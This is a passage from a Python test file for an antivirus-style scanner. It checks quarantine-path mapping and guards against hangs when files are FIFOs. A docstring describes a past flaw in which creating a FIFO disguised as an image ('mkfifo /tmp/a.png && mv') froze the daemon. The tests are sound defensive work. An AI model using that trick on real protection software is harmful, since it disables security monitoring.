        assert eng._root_map == [(str(base / "bin" / "sub"), str(base / "usr_bin" / "sub"))]
        quar.close()

    def test_longest_prefix_first(self, cfg, sig_db, base) -> None:
        (base / "usr_bin" / "sub").mkdir()
        (base / "other").mkdir()
        (base / "usr_bin" / "sub2").symlink_to(base / "other")
        eng, quar = self._engine(cfg, sig_db, [base / "bin", base / "bin" / "sub2"])
        assert eng._quarantine_path(str(base / "bin" / "sub2" / "x")) == str(base / "other" / "x")
        assert eng._quarantine_path(str(base / "bin" / "x")) == str(base / "usr_bin" / "x")
        quar.close()

    def test_prefix_boundary(self, cfg, sig_db, base) -> None:
        (base / "binx").mkdir()
        eng, quar = self._engine(cfg, sig_db, [base / "bin"])
        assert eng._quarantine_path(str(base / "binx" / "m")) == str(base / "binx" / "m")
        assert eng._quarantine_path(str(base / "bin")) == str(base / "usr_bin")
        quar.close()

    def test_path_outside_monitor_paths_unchanged(self, cfg, sig_db, base) -> None:
        eng, quar = self._engine(cfg, sig_db, [base / "bin"])
        p = str(base / "etc" / "passwd")
        assert eng._quarantine_path(p) == p
        quar.close()

    def test_missing_monitor_path_ignored(self, cfg, sig_db, base) -> None:
        eng, quar = self._engine(cfg, sig_db, [base / "nope", base / "bin"])
        assert eng._root_map == [(str(base / "bin"), str(base / "usr_bin"))]
        quar.close()


def _no_hang(fn, *args, timeout: float = 5.0):
    """Roda fn numa thread daemon. Falha se travar (FIFO sem escritor)."""
    import threading
    out: dict = {}

    def run() -> None:
        try:
            out["ret"] = fn(*args)
        except BaseException as exc:   # noqa: BLE001 - o teste confere o tipo
            out["exc"] = exc

    t = threading.Thread(target=run, daemon=True)
    t.start()
    t.join(timeout)
    assert not t.is_alive(), f"{getattr(fn, '__name__', fn)} travou em FIFO"
    return out


class TestFifoNoHang:
    """
    `open()` de FIFO sem escritor bloqueia. O `is_elf()` do auto-scan rodava
    no event loop sem checar o tipo, e `mkfifo /tmp/a.png && mv` travava o
    daemon inteiro (IPC, iscas). No scan, o `is_file()` vinha antes do open,
    mas o arquivo podia ser trocado por FIFO no meio (2026-11-14).
    """

    @pytest.fixture
    def fifo(self, tmp_path: Path) -> Path:
        f = tmp_path / "update.png"
        os.mkfifo(f)
        return f

    def test_open_regular_refuses_fifo(self, fifo: Path) -> None:
        from ekprotection.scanner.hasher import open_regular
        out = _no_hang(open_regular, fifo)
        assert isinstance(out.get("exc"), OSError)

    def test_open_regular_reads_regular_blocking(self, tmp_path: Path) -> None:
        import fcntl
        from ekprotection.scanner.hasher import open_regular
        f = tmp_path / "a.bin"; f.write_bytes(b"abc" * 1000)
        with open_regular(f) as fh:
            assert not fcntl.fcntl(fh.fileno(), fcntl.F_GETFL) & os.O_NONBLOCK
            assert fh.read() == b"abc" * 1000

    def test_open_regular_follows_file_symlink(self, tmp_path: Path) -> None:
        # semântica de antes mantida: o scanner segue link de arquivo
        from ekprotection.scanner.hasher import open_regular
        (tmp_path / "real").write_bytes(b"\x7fELF")
        (tmp_path / "link").symlink_to("real")
        with open_regular(tmp_path / "link") as fh:
            assert fh.read() == b"\x7fELF"

    def test_open_regular_refuses_directory(self, tmp_path: Path) -> None:
        from ekprotection.scanner.hasher import open_regular
        with pytest.raises(OSError):
            open_regular(tmp_path)

    def test_helpers_on_fifo_return(self, fifo: Path) -> None:
        assert _no_hang(is_elf, fifo)["ret"] is False
        assert _no_hang(is_script, fifo)["ret"] is False
        assert _no_hang(file_entropy, fifo)["ret"] == 0.0
        assert isinstance(_no_hang(sha256_file, fifo).get("exc"), OSError)

    def test_heuristics_on_fifo_return(self, cfg: ConfigManager, fifo: Path) -> None:
        from ekprotection.heuristics.engine import HeuristicEngine
        out = _no_hang(HeuristicEngine(cfg).analyze, fifo)
        assert "exc" not in out, out

    def test_scan_file_swapped_to_fifo_after_is_file(self, engine: ScanEngine, fifo: Path) -> None:
        # simula a troca entre o is_file() e o open (corrida)
        with patch.object(Path, "is_file", lambda self: True):
            out = _no_hang(engine.scan_file, fifo)
        assert out["ret"].verdict in (ScanVerdict.ERROR, ScanVerdict.SKIPPED), out
